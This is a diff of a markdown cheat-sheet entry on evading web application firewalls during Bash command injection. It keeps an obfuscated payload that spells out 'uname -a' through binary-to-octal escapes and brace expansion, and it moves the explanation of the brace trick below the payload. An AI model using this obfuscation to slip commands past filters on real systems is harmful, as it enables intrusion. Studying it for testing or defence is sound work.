@@ -5,15 +5,9 @@ Bash Command Injection WAF Bypass
 
 - [Decimal -> Binary](https://www.rapidtables.com/convert/number/decimal-to-binary.html)
 
-> Using a **comma** `,` from **Brace Expansion** so it acts like a **space**. <br>
-
 <br>
 
-> The reason why we use **Brace Expansion**:
-```console
-$ echo {ola,mundo}
-ola mundo
-```
+<hr>
 
 <br>
 
@@ -21,8 +15,15 @@ ola mundo
 ```bash
 ${!##\-}<<<{\$\'\\$(($((1<<1))#10100101))\\$(($((1<<1))#10011100))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10011011))\\$(($((1<<1))#10010001))\',\$\'\\$(($((1<<1))#110111))\\$(($((1<<1))#10001101))\'}
 ```
+> Using a **comma** `,` from **Brace Expansion** so it acts like a **space**. <br>
+> The reason why we use **Brace Expansion**: <br>
+```console
+$ echo {ola,mundo}
+ola mundo
+```
+
 > In short, this is what's happening: ([Click to see full explanation](#explicação-em-inglês))
-- `{\$\'command-1\',\$\'command-2\'}`
+- `{\$\'command1\',\$\'command2-or-argument2\'}`
 
 <br>
 
